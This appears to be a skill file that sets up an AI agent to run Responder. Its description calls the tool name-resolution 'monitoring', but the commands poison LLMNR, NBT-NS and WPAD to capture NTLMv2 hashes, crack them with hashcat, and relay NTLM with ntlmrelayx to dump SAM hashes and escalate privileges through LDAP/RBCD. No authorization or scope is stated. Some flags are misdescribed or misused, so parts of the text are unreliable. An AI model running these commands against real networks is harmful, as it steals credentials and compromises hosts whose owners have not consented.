---
name: responder-cli
description: "Responder — мониторинг сетевого разрешения имён LLMNR/NBT-NS/mDNS и перехват хэшей NetNTLM. Расположен: /usr/local/bin/responder."
allowed-tools: Bash(responder *), Bash(Responder *), Read
---

# responder-cli

Binary: `/usr/local/bin/responder` (may require sudo)
Config: `/etc/responder/Responder.conf`

## Key invocations

```bash
# Standard poison on interface (capture NTLMv2)
sudo responder -I eth0 -wf

# With WPAD (force proxy auth)
sudo responder -I eth0 -wf --wpad

# Analyse mode only (no poisoning, just sniff)
sudo responder -I eth0 -A

# Disable SMB/HTTP servers (relay-only setup)
sudo responder -I eth0 -wf --disable-ess

# View captured hashes
cat /usr/share/responder/logs/SMB-NTLMv2-*.txt
# or
cat /var/lib/responder/logs/SMB-NTLMv2-*.txt 2>/dev/null || ls /usr/share/responder/logs/

# Crack captured NTLMv2 with hashcat
hashcat -m 5600 /usr/share/responder/logs/SMB-NTLMv2-*.txt /usr/share/wordlists/rockyou.txt
```

## NTLM relay (ntlmrelayx) — pair with Responder

```bash
# Turn off SMB/HTTP in Responder.conf first, then:
impacket-ntlmrelayx -tf targets.txt -smb2support
# Dump SAM automatically when relay succeeds
impacket-ntlmrelayx -tf targets.txt -smb2support --dump-lm

# LDAP relay → RBCD attack
impacket-ntlmrelayx -tf ldap://<dc-ip> --escalate-user <compromised-user>
```
